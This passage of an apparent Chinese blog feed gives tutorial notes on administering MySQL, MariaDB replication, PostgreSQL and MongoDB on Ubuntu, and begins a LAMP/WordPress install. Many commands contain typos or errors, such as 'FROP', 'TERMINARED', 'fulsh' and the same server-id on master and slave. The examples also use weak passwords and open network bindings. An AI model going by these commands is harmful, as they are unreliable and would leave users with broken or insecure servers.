修改存储引擎（这里指定表）</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> student <span class="keyword">engine</span>=MYISAM;</span><br></pre></td></tr></table></figure></p><p><strong>修改表名</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> student <span class="keyword">RENAME</span> student2;</span><br></pre></td></tr></table></figure></p><p><strong>修改字段数据类型</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> student <span class="keyword">MODIFY</span> <span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">30</span>);</span><br></pre></td></tr></table></figure></p><p><strong>修改字段名</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> student <span class="keyword">CHANGE</span> <span class="keyword">name</span> uname <span class="built_in">varchar</span>(<span class="number">40</span>);</span><br></pre></td></tr></table></figure></p><p><strong>增加字段</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> student <span class="keyword">ADD</span> techer_name vchar(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">after</span> <span class="keyword">id</span>;  <span class="comment"># 位置放在id字段的后面</span></span><br></pre></td></tr></table></figure></p><p><strong>删除字段</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> student FROP teacher_name;</span><br></pre></td></tr></table></figure></p><h4 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h4><h6 id="备份导出"><a href="#备份导出" class="headerlink" title="备份导出"></a>备份导出</h6><p>备份库，表<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -u root -p tes_db  &gt;db_back.sql</span><br><span class="line">mysqldump -u root -p test_db users &gt;db_back.sql</span><br><span class="line">mysqldump --all-databases -u root -p &gt;all_db_back.sql</span><br></pre></td></tr></table></figure></p><p>备份指定数据<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先进入sql命令终端，进行导出</span></span><br><span class="line">select * from users; &gt; q.sql</span><br><span class="line"><span class="comment">## 或者</span></span><br><span class="line"><span class="comment"># 1. 先把sql语句保存为文件，</span></span><br><span class="line">echo 'select * from users;' &gt; q.sql</span><br><span class="line"><span class="comment"># 2.然后执行来进行导出</span></span><br><span class="line">mysql -u root -p test  &lt; q.sql  &gt;out.csv</span><br></pre></td></tr></table></figure></p><p>导出CSV<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%secure%'</span>;  <span class="comment"># 先找到备份路径，找到secure_file_priv路径就是默认导出的路径</span></span><br><span class="line"><span class="comment"># 保存， 并执行分隔或换行</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'/var/lib/mysql-files/aaa.csv'</span> <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">','</span> <span class="keyword">enclosed</span> <span class="keyword">by</span> <span class="keyword">lines</span> <span class="string">'"'</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">'\n'</span>;</span><br></pre></td></tr></table></figure></p><h6 id="导入"><a href="#导入" class="headerlink" title="导入"></a>导入</h6><p>导入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建库的命令</span></span><br><span class="line">mysqladmin -u root -p create db2  <span class="comment"># 也可以在sql终端  create database xxx;</span></span><br><span class="line"><span class="comment"># 导入</span></span><br><span class="line">mysql -u root -p db2 &lt; db_bak.sql</span><br></pre></td></tr></table></figure></p><p>导入CSV<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LOAD DATA INFILE <span class="string">'/var/lib/mysql-files/aaa.csv'</span> INTO TABLE users</span><br><span class="line">FIELDS TERMINARED BY <span class="string">','</span> ENCLOSED BY <span class="string">'"'</span></span><br><span class="line">LINES TERMINARED BY \n IGNORE 1 ROWS;</span><br></pre></td></tr></table></figure></p><h2 id="MariDB"><a href="#MariDB" class="headerlink" title="MariDB"></a><font color="red">MariDB</font></h2><h4 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h4><p>安装<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install mariadb-server</span><br></pre></td></tr></table></figure></p><p>安全认证<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql_secure_installation</span><br></pre></td></tr></table></figure></p><p>改为密码认证<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql</span><br><span class="line">use mysql;</span><br><span class="line"></span><br><span class="line">select user.host,plugin,password from mysql.user;   <span class="comment"># 查看</span></span><br><span class="line">update user <span class="built_in">set</span> plugin=<span class="string">''</span> <span class="built_in">where</span> user =<span class="string">'root'</span>   <span class="comment"># mysql_native_password或空就行</span></span><br><span class="line">fulsh privileges;</span><br></pre></td></tr></table></figure></p><p>配置文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/mysql/mariadb.conf.d/50-server.cnf</span></span><br><span class="line"><span class="built_in">bind</span>-address = 0.0.0.0 <span class="comment"># 每一个网卡都会侦听3306</span></span><br></pre></td></tr></table></figure></p><h4 id="主备服务器-数据库复制"><a href="#主备服务器-数据库复制" class="headerlink" title="主备服务器(数据库复制)"></a>主备服务器(数据库复制)</h4><p><strong>复制  Replication</strong><br>Master -&gt; Slave    读/写<br>限定所有库，指定库，表 进行复制</p><p><strong>复制原理</strong><br>bin-log        二进制日志<br>所有DB事件先写入bin-log<br>Slave从Master读取bin-log</p><p><strong>用途</strong></p><ul><li>扩展：Slave分担master负载</li><li>分析：数据分析不影响Master</li><li>备份：作为一种数据备份手段</li><li>分布：异地保存数据副本（也可以实现应用访问本地库）</li></ul><h6 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h6><p>1.安装两台独立的MariaDB服务器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">复制之前用导入导出数据库的方式保持Master/Slave数据一致</span><br><span class="line">复制前锁定库(禁止写入)        # 生产环境</span><br><span class="line">    flush tables with read lock;</span><br></pre></td></tr></table></figure></p><p>2.配置 Master<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># suo vim /etc/mysql/conf.d/mysql.cnf    #增加如下配置</span></span><br><span class="line">[mysqld]</span><br><span class="line"><span class="built_in">log</span>-bin    <span class="comment"># 开启bin-log功能</span></span><br><span class="line">binlog-do-db=<span class="built_in">test</span></span><br><span class="line"><span class="comment"># binlog-ignore-db="mysql"   # 除了忽略的库，其他的全复制</span></span><br><span class="line">server-id=1</span><br></pre></td></tr></table></figure></p><p>3.配置master的mariadb远程访问<br><code>bind-address  0.0.0.0</code></p><p>4.重启服务<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart mariadb</span><br></pre></td></tr></table></figure></p><p>5.配置master<br>创建用户帐号<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#192.168.0.111 是slave的地址， *.*允许复制所有数据库, replicate用户名</span></span><br><span class="line">grant replicate *.* to <span class="string">'replicate'</span>@<span class="string">'192.168.0.111'</span> with identified by <span class="string">'passwd'</span>;</span><br></pre></td></tr></table></figure></p><p>6.配置Slave<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 1.</span></span><br><span class="line"><span class="comment"># suo vim /etc/mysql/conf.d/mysql.cnf    #增加如下配置</span></span><br><span class="line">[mysqld]</span><br><span class="line">server-id=1</span><br><span class="line"></span><br><span class="line"><span class="comment">## 2.开启远程访问bind-address  0.0.0.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 3. 重启数据库服务</span></span><br></pre></td></tr></table></figure></p><p>7.登录sql终端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># master_user是master服务器上创建的mysql的用户</span></span><br><span class="line">change master to master_host=<span class="string">"192.168.0.112"</span>,master_user=<span class="string">"replicate"</span>,master_password=<span class="string">'password'</span>;</span><br></pre></td></tr></table></figure><p>8.打开master锁<br><code>unlock tables;</code></p><p>9.查看slave状态<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- slave的sql终端</span></span><br><span class="line"><span class="keyword">show</span> slaves <span class="keyword">status</span>\G</span><br><span class="line"><span class="keyword">start</span> <span class="keyword">slave</span>;    <span class="comment"># 如果没启动，可以手动启动</span></span><br></pre></td></tr></table></figure></p><p>测试效果<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在master执行</span></span><br><span class="line"><span class="built_in">cd</span> <span class="built_in">test</span>;</span><br><span class="line">insert into users values(1,<span class="string">'yyy'</span>,<span class="string">'pass'</span>);</span><br><span class="line">delete from users <span class="built_in">where</span> id=1;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在slave上查询，发现数据已经同步过来了，近乎实时</span></span><br></pre></td></tr></table></figure></p><p><strong>Mysqltuner – 配置调优工具包</strong><br>安装<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install mysql</span><br></pre></td></tr></table></figure></p><p>运行<br><code>sudo Mysqltuner</code><br>会生成一堆信息配置调优建议(绿色的表示没问题，其他颜色的可以根据帮助来优化)</p><h2 id="Postgresql"><a href="#Postgresql" class="headerlink" title="Postgresql"></a><font color="red">Postgresql</font></h2><blockquote><p>下一代关系数据库</p></blockquote><h4 id="配置和修改"><a href="#配置和修改" class="headerlink" title="配置和修改"></a>配置和修改</h4><ul><li><code>高并发</code>情况下<code>性能</code>优于MySQL</li><li>侦听端口 TCP <code>5432</code></li></ul><p><strong>安装</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install postgresql</span><br></pre></td></tr></table></figure></p><p><strong>身份认证</strong></p><ul><li>默认使用IDENT身份认证方式</li><li>使用与操作系统同名的数据库帐号(<code>postgres</code>相当与MySQL中的root)</li></ul><p><strong>进入</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -u postgres psql</span><br><span class="line"><span class="comment"># 直接登录到库的名称(template1是默认生成的)</span></span><br><span class="line">sudo -u postgres psql template1</span><br></pre></td></tr></table></figure></p><p><strong>修改密码</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sql终端</span></span><br><span class="line"><span class="comment"># 使用加密的方式</span></span><br><span class="line">alert user postgres with encrypted password <span class="string">'your_passwd'</span>;</span><br><span class="line">\q    <span class="comment"># 退出</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bash终端</span></span><br><span class="line"><span class="comment"># 修改配置文件</span></span><br><span class="line">vim /etc/postgresql/10/main/pg_hba.conf</span><br><span class="line"><span class="built_in">local</span>    all    postgres    md5</span><br><span class="line"><span class="comment"># 本地登录    所有数据库    身份    密码md5加密</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启服务</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录  -W输入密码</span></span><br><span class="line">psql -U postgres -W -d db_name</span><br></pre></td></tr></table></figure></p><p><strong>配置文件</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/etc/postgresql/&lt;version&gt;/main    <span class="comment"># 配置文件目录</span></span><br><span class="line">/etc/postgresql/10/main/pg_ident.conf    <span class="comment"># IDENT身份认证配置</span></span><br><span class="line">/etc/postgresql/10/main/postgresql.conf    <span class="comment"># 网络身份认证配置</span></span><br><span class="line">    <span class="comment"># listen_address='*'        # IPV6 '::'</span></span><br></pre></td></tr></table></figure></p><p><strong>网络连接</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 客户端</span></span><br><span class="line">sudo apt install postgresql-client</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置允许哪些主机连接我们(必须指定掩码)</span></span><br><span class="line">vim /etc/postgresql/10/main/pg_hba.conf</span><br><span class="line"><span class="built_in">local</span>    all    postgres    192.168.0.111/32 md5</span><br><span class="line"><span class="comment">#重启服务</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端连接</span></span><br><span class="line">psql -h 192.168.0.112 -U postgres -W -d db_name</span><br></pre></td></tr></table></figure></p><p><strong>创建帐号</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># postgres权限太大，不建议平时使用</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># F1 服务器端终端</span></span><br><span class="line">sudo -u postgres createuser xps  <span class="comment"># gropuser xps</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># F2  sql命令行</span></span><br><span class="line">create user foobar;    <span class="comment"># drop user xps</span></span><br></pre></td></tr></table></figure></p><p><strong>文档手册</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install postgresql-doc-10</span><br><span class="line">/usr/share/postgresq-doc-10/html/index.html</span><br><span class="line"></span><br><span class="line">官方文档:</span><br><span class="line">https://www.postgresql.org/docs/current/static/tutorial.html</span><br></pre></td></tr></table></figure></p><h4 id="基本指令"><a href="#基本指令" class="headerlink" title="基本指令"></a>基本指令</h4><p>创建库<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line">sudo -u postgres createdb mydb;</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">create database mydb;</span><br></pre></td></tr></table></figure></p><p>删除库<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -u postgres dropedb mydb;</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">drop database mydb;</span><br></pre></td></tr></table></figure></p><p>创建表<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> <span class="keyword">users</span></span><br><span class="line">(</span><br><span class="line">uname <span class="built_in">varchar</span>(<span class="number">25</span>);</span><br><span class="line">pwd carchar(25);</span><br><span class="line">date date</span><br><span class="line">);</span><br><span class="line">``</span><br><span class="line"></span><br><span class="line">插入数据</span><br><span class="line">```bash</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span> <span class="keyword">values</span>(<span class="string">'xps'</span>,<span class="string">'1234567890'</span>,<span class="string">'1997-07-07'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 批量插入数据(数据提前保存)</span></span><br><span class="line">copy users from '/home/user/users.txt'</span><br></pre></td></tr></table></figure></p><p>快捷命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">\c db_name    <span class="comment"># 切换数据库 （use mydb;）</span></span><br><span class="line">\c - username    <span class="comment"># 切换用户</span></span><br><span class="line">\l            <span class="comment"># 列出数据库(show databases;)</span></span><br><span class="line">\dt             <span class="comment"># 列出表(show tables;)</span></span><br><span class="line">\d    table_name    <span class="comment"># 查看表结构</span></span><br></pre></td></tr></table></figure></p><h2 id="NoSQL概览与MongoDB"><a href="#NoSQL概览与MongoDB" class="headerlink" title="NoSQL概览与MongoDB"></a><font color="red">NoSQL概览与MongoDB</font></h2><p><img src="/ubuntu server-数据库管理服务/20200430164041499_1710130793.png" alt></p><p><img src="/ubuntu server-数据库管理服务/20200430164659724_1776362163.png" alt></p><p><img src="/ubuntu server-数据库管理服务/20200430165730935_61571111.png" alt></p><p><strong>常见的NoSQL数据库类型</strong><br>1.键值对类型<br><img src="/ubuntu server-数据库管理服务/20200430165836806_1146424929.png" alt><br><img src="/ubuntu server-数据库管理服务/20200430165955029_600511168.png" alt><br><img src="/ubuntu server-数据库管理服务/20200430170233715_1141118525.png" alt><br><img src="/ubuntu server-数据库管理服务/20200430170407242_2033108350.png" alt><br><img src="/ubuntu server-数据库管理服务/20200430170848764_1597209188.png" alt><br><img src="/ubuntu server-数据库管理服务/20200430171004638_167406085.png" alt></p><p><code>Paper</code>推荐多看看</p><h4 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h4><p>安装<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y mongodb</span><br></pre></td></tr></table></figure></p><p>客户端<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 本地登录</span></span><br><span class="line">mongo</span><br><span class="line"><span class="comment"># 远程登录</span></span><br><span class="line">mongo 192.168.0.112:27017/db_name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 常用管理命令</span></span><br><span class="line"><span class="built_in">help</span></span><br></pre></td></tr></table></figure></p><p>进入库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use mydb;</span><br><span class="line"># 如果不存入数据，他还是就没了</span><br></pre></td></tr></table></figure></p><p>输入数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 创建文档集</span><br><span class="line">db.createCollection(&apos;users&apos;)</span><br><span class="line"># 插入数据</span><br><span class="line">db.users.insert(&#123;&apos;name&apos;:&apos;uuu&apos;,&apos;uid&apos;:123&#125;)</span><br></pre></td></tr></table></figure></p><p>查询库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show dbs</span><br><span class="line">show collections</span><br></pre></td></tr></table></figure></p><p>多赋值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.users.insert(&#123;&apos;name&apos;:&apos;uuu&apos;,&apos;uid&apos;:123,gid:[111,222,333]&#125;)</span><br></pre></td></tr></table></figure></p><p>查询<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">db.users.find();</span><br><span class="line">db.users.findOne(&#123;&apos;uid&apos;:1001&#125;)</span><br><span class="line">db.users.findOne(&#123;&apos;uid&apos;:&#123;$gt：1000&#125;&#125;)   # 大于</span><br><span class="line">db.users.find(&#123;&apos;uid&apos;:&#123;$gt：1000&#125;&#125;)   # 大于</span><br><span class="line"></span><br><span class="line">db.users.find(&#123;$or: [&#123;name:&apos;ubuntu&apos;&#125;, &#123;name;&apos;centos&apos;&#125;]&#125;)   # or</span><br><span class="line"></span><br><span class="line">db.users.findOne(&#123;&apos;uid&apos;:1001&#125;, &#123;name:0&#125;)    # name:0  不显示name字段</span><br></pre></td></tr></table></figure></p><p>修改记录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.users.update(&#123;&apos;uid&apos;:1001&#125;, &#123;$set:&#123;name:&apos;hhh&apos;&#125;&#125;)</span><br></pre></td></tr></table></figure></p><p>删除记录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.users.remove(&#123;&apos;uid&apos;:1001&#125;, )</span><br></pre></td></tr></table></figure></p><p>删除collection<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.users.drop()</span><br></pre></td></tr></table></figure></p><p>删库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.dropDatabase()</span><br></pre></td></tr></table></figure></p><p>详细用法参考官方文档……</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ubuntu-server-数据库管理服务&quot;&gt;&lt;a href=&quot;#ubuntu-server-数据库管理服务&quot; class=&quot;headerlink&quot; title=&quot;ubuntu-server-数据库管理服务&quot;&gt;&lt;/a&gt;ubuntu-server-数据库管理服务&lt;/
      
    
    </summary>
    
      <category term="Linux" scheme="http://www.xpshuai.cn/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://www.xpshuai.cn/tags/Linux/"/>
    
      <category term="ubuntu" scheme="http://www.xpshuai.cn/tags/ubuntu/"/>
    
      <category term="ubuntu-server-数据库管理服务" scheme="http://www.xpshuai.cn/tags/ubuntu-server-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu server-LAMP</title>
    <link href="http://www.xpshuai.cn/ubuntu%20server-LAMP/"/>
    <id>http://www.xpshuai.cn/ubuntu server-LAMP/</id>
    <published>2020-05-01T05:09:37.000Z</published>
    <updated>2020-05-01T07:24:05.551Z</updated>
    
    <content type="html"><![CDATA[<h1 id="LAMP"><a href="#LAMP" class="headerlink" title="LAMP"></a>LAMP</h1><h2 id="LAMP环境安装WordPress"><a href="#LAMP环境安装WordPress" class="headerlink" title="LAMP环境安装WordPress"></a><font color="red">LAMP环境安装WordPress</font></h2><p><img src="/ubuntu server-LAMP/20200501091107666_1415947652.png" alt></p><h4 id="安装LAMP-Linux-Apache-MySQL-PHP"><a href="#安装LAMP-Linux-Apache-MySQL-PHP" class="headerlink" title="安装LAMP(Linux + Apache + MySQL +PHP)"></a>安装LAMP(Linux + Apache + MySQL +PHP)</h4><p>自动安装<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 一次性安装 tasksel    简单快捷</span></span><br><span class="line">apt install tasksel</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行工具</span></span><br><span class="line">sudo tasksel</span><br><span class="line"><span class="comment"># 选择安装包,q 勾选，确定即可</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#测试</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;?php phpinfo();?&gt;"</span> &gt; /var/www/html/info.php</span><br></pre></td></tr></table></figure></p><p>手动安装<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">apt install apache2</span><br><span class="line">apt install mysqk-server</span><br><span class="line">    mysql_secure_installation</span><br><span class="line">apt install php libapache2-mod php-mysql</span><br><span class="line"></span><br><span class="line"><span class="comment">#测试</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;?php phpinfo();?&gt;"</span> &gt; /var/www/html/info.php</span><br></pre></td></tr></table></figure></p><h4 id="WordPress"><a href="#WordPress" class="headerlink" title="WordPress"></a>WordPress</h4><ul><li>开源免费的个人博客系统</li><li>全球1/3的个人博客采用</li><li>基于LAMP开发</li><li>开箱即用</li></ul><p><strong>安装</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget http://wordpress.org/latest.tar.gz</span><br><span class="line"></span><br><span class="line">sudo tar -zxvf latest.tar.gz -C /var/www/html</span><br><span class="line"><span class="comment"># 设置权限</span></span><br><span class="line">sudo chown www-data:www_data -R /var/www/html/myshop</span><br><span class="line"><span class="comment"># 还没有数据库</span></span><br></pre></td></tr></table></figure></p><p><strong>创建数据库</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 进入sql命令行（建议用户名密码和库名不要这么简单易猜）</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> wpdb;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> <span class="string">'wpuser'</span>@<span class="string">'localhost'</span> <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'12345678'</span>;</span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> <span class="keyword">on</span> wpdb.* <span class="keyword">to</span> <span class="string">'wpuser'</span>@<span class="string">'localhost'</span> <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'12345678'</span> <span class="keyword">with</span> <span class="keyword">grant</span> <span class="keyword">option</span>;</span><br><span class="line"><span class="keyword">flush</span> <span class="keyword">privileges</span>;</span><br></pre></td></tr></table></figure></p><p><strong>配置文件</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/html/wordpress/</span><br><span class="line">cp wp-config-sample.php wp-config.php    <span class="comment"># 从模板文件复制</span></span><br><span class="line">vim wp-config.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改库名，用户，密码</span></span><br><span class="line"><span class="comment"># 